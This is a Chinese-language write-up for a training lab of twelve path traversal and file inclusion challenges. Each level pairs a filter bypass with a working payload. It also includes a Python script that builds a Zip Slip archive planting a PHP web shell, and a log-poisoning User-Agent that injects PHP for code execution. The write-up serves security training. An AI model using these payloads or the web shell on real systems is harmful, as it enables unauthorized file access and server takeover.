# 路径遍历漏洞靶场 (Path Traversal Labs) - WriteUp

本靶场包含 12 个循序渐进的关卡，涵盖了路径遍历与文件包含漏洞的常见场景和绕过技巧。

## Level 1: 裸奔的参数
- **描述**：没有任何过滤，直接将 GET 参数传入 `include()`。
- **Payload**：
  ```text
  ?file=../../flags/flag1.txt
  ```
  或者读取系统文件：`?file=C:\Windows\win.ini` 或 `?file=../../../../../../../../Windows/win.ini`

## Level 2: 天真的替换
- **描述**：后端使用 `str_replace('../', '', $file)` 进行单次替换过滤。
- **绕过原理**：双写绕过。当 `....//` 被替换掉中间的 `../` 后，剩下的字符会重新组合成 `../`。
- **Payload**：
  ```text
  ?file=....//....//flags/flag2.txt
  ```

## Level 3: 编码的伪装
- **描述**：模拟 WAF 拦截了明文的 `.` 和 `/`，但后端在接收参数后又进行了一次 `urldecode()` 解码。
- **绕过原理**：双重 URL 编码绕过。将 `../` 进行两次 URL 编码，即 `%252e%252e%252f`，可以绕过第一次的正则检测。
- **Payload**：
  ```text
  ?file=%252e%252e%252f%252e%252e%252fflags%252fflag3.txt
  ```

## Level 4: 截断的艺术
- **描述**：后端强制在输入后拼接了 `.html` 后缀。
- **绕过原理**：利用 `%00` (空字节) 截断。在旧版 PHP 或 C 语言底层中，字符串以空字节作为结束标志，导致后面的后缀被丢弃。
- **Payload**：
  ```text
  ?file=../../flags/flag4.txt%00
  ```

## Level 5: 路径的极限
- **描述**：后端强制拼接 `.html` 后缀，且过滤了空字节。
- **绕过原理**：利用操作系统最大路径长度限制绕过 (Path Truncation)。通过填充大量的 `./` 使得路径超过限制，导致尾部的 `.html` 被截断丢弃。
- **Payload**：
  ```text
  ?file=../../flags/flag5.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
  ```
  *(注：根据系统不同需要适当增加 `./` 的数量直到长度超出限制)*

## Level 6: 压缩包的陷阱
- **描述**：后台提供 ZIP 解压功能，但未校验解压文件的名称。
- **绕过原理**：Zip Slip 漏洞。构造一个恶意压缩包，其中包含名为 `../../../../shell.php` 的文件，上传解压后即可跨目录写入文件。
- **通关方法**：
  1. 使用 Python 等脚本创建一个恶意 ZIP 包：
     ```python
     import zipfile
     with zipfile.ZipFile('evil.zip', 'w') as z:
         z.writestr('../../shell.php', '<?php system($_GET["cmd"]); ?>')
     ```
  2. 上传该 `evil.zip`，即可在靶场 `vuln/` 目录下生成 `shell.php`。

## Level 7: 日志投毒
- **描述**：存在 LFI（本地文件包含）漏洞，但没有现成的敏感文件可以利用，需要通过包含日志文件来获取 RCE。
- **绕过原理**：日志投毒 (Log Poisoning)。系统会将请求的 `User-Agent` 记录到 `logs/access.log`。可以将恶意 PHP 代码放入 UA 中，然后通过 LFI 包含日志文件执行代码。
- **通关方法**：
  1. 抓包，修改 `User-Agent` 为 `<?php system("type ..\..\flags\flag7.txt"); ?>` 并发送请求。
  2. 访问包含日志文件：`?file=logs/access.log`。

## Level 8: 隐藏的参数
- **描述**：URL 中没有参数，但存在包含漏洞。
- **绕过原理**：参数隐藏在 HTTP 请求的 Cookie 中。
- **通关方法**：
  1. 抓包或通过浏览器开发者工具查看 Cookie。
  2. 将 `file_path` 的值修改为 `../../flags/flag8.txt`。

## Level 9: 大小写的秘密
- **描述**：后台使用 `strpos` 过滤了关键字 `flags`。
- **绕过原理**：利用 Windows 文件系统不区分大小写的特性。虽然 PHP 的 `strpos` 是大小写敏感的，但底层 Windows 可以正常读取大写变体的文件。
- **Payload**：
  ```text
  ?file=../../FlAgS/flag9.txt
  ```

## Level 10: 绝对的真理
- **描述**：后台强制屏蔽了相对路径符号 `..`。
- **绕过原理**：既然无法使用相对路径进行向上跳转，则可以直接使用绝对路径读取目标文件（页面通常会泄漏当前的绝对路径位置）。
- **Payload**：
  根据页面泄漏的路径，构造类似如下的绝对路径：
  ```text
  ?file=D:\Path traversal-Sec\flags\flag10.txt
  ```
  *(请根据实际部署路径调整)*

## Level 11: 前缀的限制
- **描述**：后台强制校验了传入路径必须以指定的安全目录（例如 `.../images/`）开头。
- **绕过原理**：虽然开头合法，但在合法开头之后可以继续使用 `../` 跳出该目录。
- **Payload**：
  ```text
  ?file=D:\Path traversal-Sec\vuln\images\..\..\flags\flag11.txt
  ```
  *(注：将前面的部分替换为页面提示的要求前缀)*

## Level 12: 后缀的欺骗
- **描述**：后台严格校验了文件扩展名必须为 `.png`。
- **绕过原理**：结合了扩展名校验与 `%00` 空字节截断。传入以 `.png` 结尾的字符串绕过 PHP 层的验证，但利用 `%00` 截断底层文件读取，从而读取非 png 文件。
- **Payload**：
  ```text
  ?file=../../flags/flag12.txt%00.png
  ```
